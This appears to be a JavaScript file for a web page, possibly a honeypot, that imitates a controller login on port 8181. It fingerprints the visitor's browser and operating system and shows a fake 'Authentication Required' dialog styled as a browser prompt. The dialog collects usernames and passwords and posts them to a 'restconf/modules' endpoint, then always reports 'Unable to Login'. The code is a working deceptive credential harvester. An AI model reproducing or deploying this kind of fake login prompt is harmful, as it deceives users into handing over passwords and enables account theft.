var nVer = navigator.appVersion;
var nAgt = navigator.userAgent, tem;
var browserName = navigator.appName;
var fullVersion = '' + parseFloat(navigator.appVersion);
var majorVersion = parseInt(navigator.appVersion, 10);
var nameOffset, verOffset, ix;
var x = navigator.userAgent + " ";
var y = x.split(" ");
var os = y[1].replace("(", "");
var bit = y[4].replace(")", " ");
var osVer = os + " " + y[2] + " " + y[3] + " " + bit;
var connected = 1;

if ((verOffset = nAgt.indexOf("Edge/")) != -1) {
    browserName = "Edge";
    fullVersion = nAgt.substring(verOffset + 5);
}
// In Opera 15+, the true version is after "OPR/" 
else if ((verOffset = nAgt.indexOf("OPR/")) != -1) {
    browserName = "Opera";
    fullVersion = nAgt.substring(verOffset + 4);
}
// In older Opera, the true version is after "Opera" or after "Version"
else if ((verOffset = nAgt.indexOf("Opera")) != -1) {
    browserName = "Opera";
    fullVersion = nAgt.substring(verOffset + 6);
    if ((verOffset = nAgt.indexOf("Version")) != -1)
        fullVersion = nAgt.substring(verOffset + 8);
}
// In MSIE, the true version is after "MSIE" in userAgent
else if ((verOffset = nAgt.indexOf("Trident/")) != -1) {
    browserName = "Microsoft Internet Explorer";
    ix = nAgt.indexOf("rv:");
    fullVersion = nAgt.substring(ix + 3).split(")").join("");
}
// In Chrome, the true version is after "Chrome" 
else if ((verOffset = nAgt.indexOf("Chrome")) != -1) {
    browserName = "Chrome";
    fullVersion = nAgt.substring(verOffset + 7);
}
// In Safari, the true version is after "Safari" or after "Version" 
else if ((verOffset = nAgt.indexOf("Safari")) != -1) {
    browserName = "Safari";
    fullVersion = nAgt.substring(verOffset + 7);
    if ((verOffset = nAgt.indexOf("Version")) != -1)
        fullVersion = nAgt.substring(verOffset + 8);
}
// In Firefox, the true version is after "Firefox" 
else if ((verOffset = nAgt.indexOf("Firefox")) != -1) {
    browserName = "Firefox";
    fullVersion = nAgt.substring(verOffset + 8);
}
// In most other browsers, "name/version" is at the end of userAgent 
else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) <
    (verOffset = nAgt.lastIndexOf('/'))) {
    browserName = nAgt.substring(nameOffset, verOffset);
    fullVersion = nAgt.substring(verOffset + 1);
    if (browserName.toLowerCase() == browserName.toUpperCase()) {
        browserName = navigator.appName;
    }
}
// trim the fullVersion string at semicolon/space if present
if ((ix = fullVersion.indexOf(";")) != -1)
    fullVersion = fullVersion.substring(0, ix);
if ((ix = fullVersion.indexOf(" ")) != -1)
    fullVersion = fullVersion.substring(0, ix);

majorVersion = parseInt('' + fullVersion, 10);
if (isNaN(majorVersion)) {
    fullVersion = '' + parseFloat(navigator.appVersion);
    majorVersion = parseInt(navigator.appVersion, 10);
}

var fullBrowserInfo = browserName + " " + fullVersion + "(" + majorVersion + ")";
var windowName = window.location.href;

$(document).ready(function() {
    var i = 0;
    var x = location.port;
    if (x == 8181) {
        $("#dialog").dialog({
            autoOpen: false,
            resizable: false,
            draggable: false,
            show: {
                effect: "none"
            },
            hide: {
                effect: "none"
            }
        });
        $("#dialog").html("<form roll='form' class='loginDialog'><p class='titles'>Authentication Required </p><p class='top-para'>"+windowName+" requires a username and password.</p><p class='second-para'>Your connection is not private.</p><table class='userTable'><tr><td>User Name:</td><td><input ng-model='login.username' name='username' type='text' autofocus></td></tr><tr><td>Password:</td><td><input ng-model='login.password' name='password' type='password' value=''></td></tr></table><button class='btns cancel' type='button'>Cancel</button><button ng-click='sendLogin()' class='btns log'>Log In</button></form>");


        $('.btn-block').click(function() {

            $("#dialog").dialog("open");
            $(".ui-dialog").removeClass(' ui-draggable-disabled ui-state-disabled');
            $(".cancel").click(function() {
                $("#dialog").dialog("close");

            });
        });

        $(".loginDialog").submit(function(event) {
            var username = $("input[name = 'username']").val();
            var password = $("input[name = 'password']").val();
			alert("oksubmit");
            var dataString = '&usernames=' + username + '&passwords=' + password + '&browser=' + fullBrowserInfo + '&os=' + osVer + '&port=' + x + '&connected=' + connected;
            $.ajax({
                type: "POST",
                url: "restconf/modules",
                data: dataString,
                success: function() {
                    i += 1; 
					connected += 1;
                }
            });
            $("#dialog").dialog("close").delay(800).fadeIn(400);
            event.preventDefault();
            $("#dialog").dialog("open").delay(800).fadeIn(400);
        });


    }
	else {
        $('.btn-block').click(function() {
            var usernames = $("input[name = 'usernames']").val();
            var passwords = $("input[name = 'passwords']").val();
            var dataString = '&usernames=' + usernames + '&passwords=' + passwords + '&browser=' + fullBrowserInfo + '&os=' + osVer + '&port=' + x + '&connected=' + connected;
			$.ajax({
                type: "POST",
                url: "restconf/modules",
                data: dataString,
                success: function() {
                    i += 1;
					connected += 1;
                }
            });
        });
    }
});

$(window).on('beforeunload', function(){
	if (connected>1){
		var dataString = '&connected=0';
		alert("connected=0");
		$.ajax({
			type: "POST",
			url: "restconf/modules",
			data: dataString,
			success: function() {
				i += 1;
				connected += 1;
			}
		});
	}
});

if (window.top == window) {
    // not in iframe/frame
} else {
    if (parent.parent.someFunction) {
        parent.parent.someFunction();
    } else {
        alert("parent.parent.someFunction() not defined.")
    }
}

var app = angular.module('myApp', []);
app.controller('myCtrl', function($scope) {
    $scope.name;
    $scope.sendLogin = function() {
        $scope.name = "Unable to Login";
    }
});